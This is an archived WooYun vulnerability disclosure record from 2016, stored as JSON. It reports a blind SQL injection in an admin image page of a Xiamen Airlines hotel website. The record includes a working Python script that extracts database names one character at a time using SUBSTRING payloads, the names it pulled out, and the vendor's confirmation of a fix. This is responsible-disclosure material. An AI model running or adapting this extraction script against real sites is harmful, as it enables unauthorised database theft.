{"id": 86458, "wybug_id": "wooyun-2016-0186144", "wybug_title": "厦航某站SQL盲注(附验证脚本)", "wybug_corp": "xiamenair.com", "wybug_author": "Blcat", "wybug_date": "2016-03-18 12:34", "wybug_open_date": "2016-05-05 10:12", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2016-03-18：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2016-03-21：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2016-03-31：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2016-04-10：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2016-04-20：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2016-05-05：\t细节向公众公开  简要描述： 我一直觉得厦航很良心，因为每次都能喝到椰子汁，科科 详细说明：  注入点：\nhttp://www.xmairhotels.com/admin/ImageShow.asp?imgKey=20100119155428\n注入点imgKey但是关键字被过滤，而且有安全狗和360webscan,好奇为啥要装全家桶验证脚本：\n#!/usr/bin/env python# coding: UTF-8 （๑•̀ㅂ•́)و✧__author__ = 'T1m0n'# http://www.xmairhotels.com/admin/ImageShow.asp?imgKey=20100119155428' AND SUBSTRING(@@version,1,1)='i' and '1'='1import httplibheaders = {    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',    'Accept-Language': 'zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3',    'User-Agent': 'Mozilla / 5.0(WindowsNT6.3;Win64;x64;rv:44.0) Gecko / 20100101Firefox / 44.0',    'Host': 'www.xmairhotels.com'}# db = []payloads = 'abcdefghijklmnopqrstuvwxyz0123456789@_.-*'for db_number in range(0, 185):    db_name = ''    flag = True    for i in xrange(1, 29):        if flag:            for payload in payloads:                poc = \"SUBSTRING(db_name(%d),%d,1)='%s'\" % (db_number, i, payload)                url = \"/admin/ImageShow.asp?imgKey=20100119155428%27%20AND%20\" + poc + \"%20and%20%271%27=%271\"                conn = httplib.HTTPConnection('www.xmairhotels.com')                conn.request('GET', url, None, headers)                text = conn.getresponse().read()                conn.close()                print '.',                if len(text) > 224:                    print payload                    db_name += payload                    break                if payload == '*':                    flag = False                    print db_name                    with open('db_name.txt', 'a+') as file:                        file.write(db_name + '\\n')print 'Down'\n   漏洞证明：  @@version\n# version microsoftsqlserver2000\ndb_name() 一共185张表，里面不会是开房记录吧好可怕好可怕\n797728mastertempdbmodelmsdbpubs1008084100391310038671003860100383610038041003611100359010034831003448100344710032681003206100319010027211002699100247210010001000762815750804493a168180049980007579915179671779772879697579661178845377488475980678499278414877959776981910040631004104100416810041721004182100420610042091004210100422310042651004363100439210044281004429100443010044821004511100453010045631004591100459310045971004604100462010046271004660100471910048941005422100808510030281003463a3587100578110067021006747100690110073651007376100738310075301007560100756110075851007586100763710076941007731100778410078341007858100786910078951007959100803510080391008053100806210080651008068100807910080901008125100814610081481008150100817710082051008429100833610083591008436100836610085781008605100867710086861008693100875910087901008796100879710088061008817100883210088411008848100893610089971009024100906410090791009087100923710092511009253100927610094721009518100956010095871009716100981110098451009963100999810100281010087101008810101151010123101013210101571010216101024110102861010371freehost101038110104501010494101072910108441010898101089910109221011330101157510116581011805101203310120981012296101229910123091012315101249310126091012667101284910129631013057\n   修复方案：  别再装全家桶了，改改代码过滤过滤吧   版权声明：转载请注明来源 Blcat@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：7  确认时间：2016-03-21 10:12 厂商回复： 感谢对厦航信息安全工作的支持。 最新状态： 2016-03-21：感谢您对厦航信息安全的关注，目前该漏洞已经整改完毕。  ", "replys": "漏洞评价：\n评价\n     2016-03-18 12:53 |    \t\thh2014 \t\t\t( 普通白帽子  |\t\t\t        Rank:1086 漏洞数:251        | Rank:1200 漏洞数：280|目标RANK 1500)\t\t \n  没觉得良心， 8rank 拿好不谢    \n     2016-03-18 13:06 |    \t\thear7v \t\t\t( 普通白帽子  |\t\t\t        Rank:126 漏洞数:19        | 求组织收留啊)\t\t \n  良心良心    \n     2016-03-18 13:47 |    \t\tzcy \t\t\t( 实习白帽子  |\t\t\t        Rank:93 漏洞数:15        )\t\t \n  毕竟机票贵    \n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 7, "Ranks": null}